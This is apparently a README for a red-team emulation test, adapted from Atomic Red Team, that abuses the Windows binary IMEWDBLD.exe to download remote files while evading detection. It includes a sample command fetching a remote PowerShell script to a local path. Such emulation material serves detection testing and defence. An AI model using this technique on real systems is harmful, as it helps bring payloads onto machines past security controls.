# Download a file with IMEWDBLD.exe

## Description
Abuses IMEWDBLD.exe, a legitimate Windows IME binary, as a "living off the land" binary (LOLBin) to download files while evading detection. Files download to INetCache directory despite dictionary error messages.

Adapted from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Arguments
- **remote_file**: URL of file to copy (default: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt`)
- **local_file**: Local path to place file (default: `C:\Users\Public\malicious.bin`)

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//command-and-control/download-using-imewdbld/ttp.yaml \
  --remote_file "https://example.com/tool.ps1" \
  --local_file "C:\Temp\script.ps1"
```

## Steps
1. **download_with_imewdbld**: Executes IMEWDBLD.exe to download a file from the specified URL. The script then searches the INetCache directory for the most recently downloaded file and outputs its path.
